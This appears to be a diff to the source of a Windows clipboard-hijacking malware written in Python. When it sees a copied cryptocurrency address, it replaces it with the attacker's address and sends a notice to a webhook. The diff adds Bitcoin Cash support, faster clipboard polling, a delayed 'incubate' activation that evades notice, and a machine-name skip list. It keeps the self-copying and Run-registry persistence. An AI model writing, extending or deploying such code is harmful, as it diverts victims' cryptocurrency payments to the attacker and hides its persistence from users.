@@ -9,6 +9,10 @@ import sys
 import re
 import os
 
+cwd = os.getcwd()
+
+ignore = []
+
 btcaddr = "SET BTC ADDRESS HERE"
 ethaddr = "SET ETH ADDRESS HERE"
 ltcaddr = "SET LTC ADDRESS HERE"
@@ -17,10 +21,12 @@ soladdr = "SET SOL ADDRESS HERE"
 dogeaddr = "SET DOGE ADDRESS HERE"
 xrpaddr = "SET XRP ADDRESS HERE"
 trxaddr = "SET TRX ADDRESS HERE"
+bchaddr = "SET BCH ADDRESS HERE"
 
 single_use = False
-
 ping = False
+incubate = False
+
 webhook_url = ""
 
 webhook_parts = webhook_url.replace("https://", "").split("/")
@@ -43,6 +49,8 @@ def is_crypto_addr(clipboard_text):
         doge_address_pattern = r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"
         xrp_address_pattern = r"^r[0-9a-zA-Z]{24,34}$"
         trx_address_pattern = r"^T[a-zA-Z0-9]{33}$"
+        bch_address_pattern = r"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"
+
 
         if re.match(btc_address_pattern, clipboard_text):
             return "BTC"
@@ -306,13 +314,42 @@ def main():
 
                                 response.read()
                                 conn.close()
+                elif var == "BCH":
+                    if bchaddr != "SET BCH ADDRESS HERE":
+                        if clipboard_text != bchaddr:
+                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{bchaddr}"'],
+                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
+                            if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                            if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
                 else:
                     pass
             except Exception:
                 pass
         except Exception:
             pass
-        time.sleep(0.25)
+        time.sleep(0.10)
 
 def dupe_self():
     try:
@@ -350,12 +387,38 @@ def check():
             dupe_path = dupe_self()
             if dupe_path:
                 add_reg(dupe_path)
-                main()
+                if incubate:
+                    sys.exit()
+                else:
+                    main()
         else:
             with open(os.path.join(folder_path, "storage.txt"), "r") as o:
                 ln1 = o.readline().strip('\n')
                 if ln1 != "True":
-                    main()
+                    if incubate:
+                        if cwd == str(os.path.join(appdata_path, "CLPPTH")):
+                            def check_incubate():
+                                with open(os.path.join(cwd, "state.txt"), "r") as f:
+                                    ln1 = f.readline().strip('\n')
+                                    current_value = int(ln1)
+                                if current_value != 2:
+                                    new_value = current_value + 1
+                                    with open(os.path.join(cwd, "state.txt"), "w") as f:
+                                        f.write(str(new_value))
+                                        sys.exit()
+                                else:
+                                    main()
+
+                            def start_incubate():
+                                dir = os.listdir(cwd)
+                                if "state.txt" not in dir:
+                                    with open(os.path.join(cwd, "state.txt"), "w") as f:
+                                        f.write("0")
+                                        sys.exit()
+                                check_incubate()
+                            start_incubate()
+                    else:
+                        main()
                 else:
                     try:
                         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -370,6 +433,7 @@ def check():
 if __name__ == "__main__":
     try:
         if os.name == "nt":
-            check()
+            if comp_name not in ignore:
+                check()
     except Exception:
         pass
